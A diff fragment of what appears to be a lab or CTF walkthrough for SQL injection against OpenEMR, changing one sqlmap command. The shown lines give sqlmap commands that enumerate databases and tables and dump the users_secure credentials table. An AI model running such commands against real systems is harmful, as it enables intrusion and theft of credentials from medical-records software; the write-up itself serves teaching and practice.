@@ -253,7 +253,7 @@ We save it in a file **"openemr.req"** and use it with SQLmap. You can perform a
 1. Database:   
    root@kali:~# sqlmap -r openemr.req --dbs
 2. Tables:
-   root@kali:~# sqlmap -r openemr.req --threads=10 -D openemr --tables
+   root@kali:~# sqlmap -r openemr.req -D openemr --tables
 3.Credentials
    root@kali:~# sqlmap -r openemr.req -D openemr -T users_secure --dump
 ~~~
